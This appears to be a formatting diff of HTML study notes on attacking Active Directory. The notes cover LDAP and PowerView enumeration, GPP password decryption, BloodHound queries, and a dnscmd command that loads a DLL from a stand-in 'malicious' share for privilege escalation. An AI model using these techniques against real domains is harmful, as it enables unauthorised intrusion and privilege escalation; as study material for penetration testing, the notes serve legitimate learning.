@@ -25,7 +25,7 @@
 <li><code>net group /domain</code> will give us the domain groups<ul>
 <li>A group assigns permissions to resources (users and other groups)</li>
 <li><code>net group &quot;{group}&quot; /domain</code></li>
-<li>Some uncommon but useful groups:<a href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a><ul>
+<li>Some uncommon but useful groups:<ul>
 <li><a href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a> - all groups</li>
 <li>AD Recycle Bin <ul>
 <li>Can read deleted AD objects</li>
@@ -69,14 +69,16 @@
 </li>
 <li>Dns Admins<ul>
 <li>Can perform dll hijacking to priv esc</li>
-<li><code>dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll</code>
-<strong>Enumeration with PowerShell and .NET Classes</strong></li>
+<li><code>dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll</code></li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<p><strong>Enumeration with PowerShell and .NET Classes</strong></p>
+<ul>
 <li>LDAP is the communication channel that AD uses to query things<ul>
 <li>If a domain machine searches for a printer, the search query uses LDAP</li>
 <li><code>LDAP://{Hostname}:{port}/{/DN}</code></li>
@@ -135,39 +137,43 @@
 </li>
 </ul>
 </li>
-<li><p>Can turn this into a function where parameters can be passed</p>
-<ul>
-<li><p>Use with <code>Import-Module .\{name}.ps1</code> and <code>LDAPSearch -q &quot;({key}={value})&quot;</code></p>
-<ul>
+<li>Can turn this into a function where parameters can be passed<ul>
+<li>Use with <code>Import-Module .\{name}.ps1</code> and <code>LDAPSearch -q &quot;({key}={value})&quot;</code><ul>
 <li><code>LDAPSearch -q &quot;(samAccountType=805306368)&quot;</code></li>
-<li><code>LDAPSearch -q &quot;(objectclass=group)&quot;</code>
-```
-function LDAPSearch {
-param (
-[string]$q
-)</li>
+<li><code>LDAPSearch -q &quot;(objectclass=group)&quot;</code></li>
 </ul>
-<p>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-$DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
-<p>$DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)</p>
-<p>$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $q)</p>
-<p>return $DirectorySearcher.FindAll()</p>
 </li>
 </ul>
 </li>
 </ul>
-<p>}
-```</p>
+<pre><code>function LDAPSearch {
+    param (
+        [string]$q
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $q)
+
+    return $DirectorySearcher.FindAll()
+
+}
+</code></pre>
 <ul>
 <li>Can then use the output with filtering<ul>
 <li><code>foreach ($group in $(LDAPSearch -q &quot;(objectCategory=group)&quot;)) { $group.properties | select {$_.cn}, {$_.member}}</code><ul>
 <li>Just basically shows the CN and members for each group </li>
-<li>This will additionally show nested groups, which <code>net.exe</code> doesn&#39;t<h3 id="enumeration-with-powerview">Enumeration with PowerView</h3>
-</li>
+<li>This will additionally show nested groups, which <code>net.exe</code> doesn&#39;t</li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<h3 id="enumeration-with-powerview">Enumeration with PowerView</h3>
+<ul>
 <li><a href="https://powersploit.readthedocs.io/en/latest/Recon/">https://powersploit.readthedocs.io/en/latest/Recon/</a></li>
 <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a><ul>
 <li>Import it using <code>Import-Module .\PowerView.ps1</code></li>
@@ -192,7 +198,7 @@ $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
 <li>Uses the Service Control Manager, which maintains database of installed services and drivers on all Windows computers</li>
 </ul>
 </li>
-<li><code>Get-NetSession -ComputerName {computername} -Verbose</code><ul>
+<li><code>Get-NetSession -ComputerName {computername} -Verbose </code><ul>
 <li>This one can return no data/wrong data depending on permissions</li>
 </ul>
 </li>
@@ -215,14 +221,16 @@ $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
 <li>Domain shares can be shared folders/files, printers, or other resources</li>
 <li>Look for interesting shares, like NETLOGON, SYSVOL, backups, docshares, or tools</li>
 <li>Can view internals using <code>ls \\{domain}\{share}</code> and read files with <code>cat</code><ul>
-<li>Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with <code>gpp-decrypt</code><h3 id="manual-enumeration">Manual Enumeration</h3>
-</li>
+<li>Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with <code>gpp-decrypt</code></li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<h3 id="manual-enumeration-1">Manual Enumeration</h3>
+<ul>
 <li><code>PsLoggedOn.exe</code> - uses Remote Registry service to enumerate registry keys to see who&#39;s logged on to a system<ul>
 <li>Not enabled by default on workstations since Windows 8, but it enabled by default on servers like 2012, 2016, 2019, and 2022</li>
 <li>Usage: <code>.\PsLoggedOn.exe \\{computer name}</code></li>
@@ -266,8 +274,8 @@ $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
 <h3 id="automatic-enumeration">Automatic Enumeration</h3>
 <p><strong>Enum4Linux</strong></p>
 <ul>
-<li>Just run <code>enum4linux {IP}</code></ul>
-<strong>BloodHound/SharpHound</strong></li>
+<li>Just run <code>enum4linux {IP}</code></li></ul>
+<strong>BloodHound/SharpHound</strong>
 <li>Capturing the system data with BloodHound:<ul>
 <li><a href="https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1">SharpHound</a><ul>
 <li>Use version 1.1.1 for kali&#39;s 4.3.1 bloodhound</li>
@@ -307,16 +315,16 @@ $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
 <li>Path to other users on the system<ul>
 <li>There might not be built in queries for this one, so go to each individual users and see the shortest paths to them</li>
 </ul>
-<li>Outbound object control of common groups (Everyone, Domain Users, Authenticated Users, etc.)</li>
+</li>
+<li>Outbound object control of common groups (Everyone, Domain Users, Authenticated Users, etc.)<ul>
+<li>There could be instances where all authenticated users can control some workstation</li>
+</ul>
 </li>
 <li>Queries:<ul>
 <li>All computers: <code>MATCH (m:Computer) RETURN m</code></li>
 <li>All users: <code>MATCH (m:User) RETURN m</code></li>
 <li>Active sessions: <code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</code></li>
-<li>Get all hostnames (for massive internal networks): <code>./cypher-shell -u neo4j -p {password} 'MATCH (c:Computer) WHERE toLower(c.name) ENDS WITH ".example.domain.tld" RETURN c.name' --format plain | tee hostnames.txt</code></li>
-<ul>
-    <li>Turn hostnames into hostname, IP csv: <code>head hostnames.txt | xargs -I {} sh -c "echo -n '{}, '; dig +short {}; echo" | grep -v -E '^$'</code></li>
-</ul>
+<li>Get all hostnames (for massive internal networks): <code>./cypher-shell -u neo4j -p {password} &#39;MATCH (c:Computer) WHERE toLower(c.name) ENDS WITH &quot;.example.domain.tld&quot; RETURN c.name&#39; --format plain | tee hostnames.txt</code></li>
 </ul>
 </li>
 <li>Interesting paths:<ol>
@@ -325,9 +333,9 @@ $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
 <li>Find Computers where Domain Users are Local Admin</li>
 <li>Shortest Path to Domain Admins from Owned Principals</li>
 <li>List Kerberoastable users</li>
+<li>User SPNs (what can certain users access)</li>
 </ol>
 </li>
-<li>User SPNs (what can certain users access)</li>
 </ul>
 </li>
 </ul>
